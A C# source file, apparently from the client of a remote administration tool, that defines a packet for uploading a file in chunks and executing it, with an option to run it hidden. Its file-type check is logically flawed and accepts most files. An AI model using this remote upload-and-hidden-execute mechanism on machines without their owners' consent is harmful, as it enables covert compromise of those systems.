using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoUploadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string FileName { get; set; }

        [ProtoMember(3)]
        public byte[] Block { get; set; }

        [ProtoMember(4)]
        public int MaxBlocks { get; set; }

        [ProtoMember(5)]
        public int CurrentBlock { get; set; }

        [ProtoMember(6)]
        public bool RunHidden { get; set; }

        public bool CorrectFileType { get; set; }

        public DoUploadAndExecute()
        {
        }

        public DoUploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
        {
            this.ID = id;
            this.FileName = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.RunHidden = runhidden;
        }

        public void Execute(Client client)
        {
            client.SendBlocking(this);
        }

        /// <summary>
        /// This will check if the file is a valid .bat or .exe. 
        /// It will then set the <see cref="CorrectFileType"/> property to either true or false.
        /// </summary>
        public void IsValidExecuteFile()
        {
            if (CurrentBlock != 0)
            {
                CorrectFileType = false;
                return;
            }

            if (Block == null || Block.Length < 2)
            {
                CorrectFileType = false;
                return;
            }

            if (Block[0] != 'M' && Block[1] != 'Z' &&
                Block[0] != 'e' && Block[1] != 'c')
            {
                CorrectFileType = false;
                return;
            }

            CorrectFileType = true;
        }
    }
}